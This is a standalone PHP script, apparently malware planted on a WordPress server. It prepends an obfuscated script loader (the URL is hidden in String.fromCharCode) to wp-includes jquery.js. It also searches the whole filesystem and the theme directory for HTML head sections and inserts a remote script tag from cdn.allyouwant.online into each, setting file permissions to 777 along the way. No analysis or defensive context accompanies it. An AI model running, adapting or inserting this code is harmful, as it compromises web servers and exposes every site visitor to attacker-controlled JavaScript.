<?php
$a = "../../../../../wp-includes/js/jquery/jquery.js";
$l = "var po = document.createElement('script'); po.type = 'text/javascript'; po.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 99, 100, 110, 46, 97, 108, 108, 121, 111, 117, 119, 97, 110, 116, 46, 111, 110, 108, 105, 110, 101, 47, 109, 97, 105, 110, 46, 106, 115, 63, 116, 61, 99); document.head.appendChild(po);";
$b = file_get_contents($a);
$c = $l . $b;
@system("chmod 777 ", realpath($a));

$b = file_get_contents($a);
if (strpos($b, '105, 110, 101, 47') !== false) {
    echo "z:" . $a;
} else {
    @file_put_contents($a, $c);
    $b = file_get_contents($a);
    if (strpos($b, '105, 110, 101, 47') !== false) {
        echo "z:" . $a;
    }
}

$a  = 'find / -type f -name "*head*" | xargs grep -rl "<head"';
$l1 = "<script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=p1'></script>";
$t  = shell_exec($a);
$t  = explode("\n", trim($t));
foreach ($t as $f) {
    
    $g = file_get_contents($f);
    if (strpos($g, 'eeduelements') !== false) {
        echo "e:" . $f;
    } else {
        $g = file_get_contents($f);
        $g = str_replace("<head>", "<head>" . $l1, $g);
        $g = str_replace("</head>", $l1 . "</head>", $g);
        @system("chmod 777 " . $f);
        @file_put_contents($f, $g);
        $g = file_get_contents($f);
        if (strpos($g, 'allyouwant') !== false) {
            echo $f;
        }
    }
}

$l1      = "<script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=rp1'></script>";
$it      = new RecursiveDirectoryIterator($_SERVER['DOCUMENT_ROOT'] . '/wp-content/themes/');
$display = Array(
    'header.php'
);
foreach (new RecursiveIteratorIterator($it) as $file) {
    if (strpos($file, 'head') !== false) {
        $f = $file;
        $g = file_get_contents($f);
        if (strpos($g, 'allyouwant') !== false) {
            echo "e:" . $f;
        } else {
            $g = file_get_contents($f);
            $g = str_replace("<head>", "<head>" . $l1, $g);
            $g = str_replace("</head>", $l1 . "</head>", $g);
            @system("chmod 777 " . $f);
            @file_put_contents($f, $g);
            $g = file_get_contents($f);
            if (strpos($g, 'allyouwant') !== false) {
                echo $f;
            }
        }
    }
}

?>
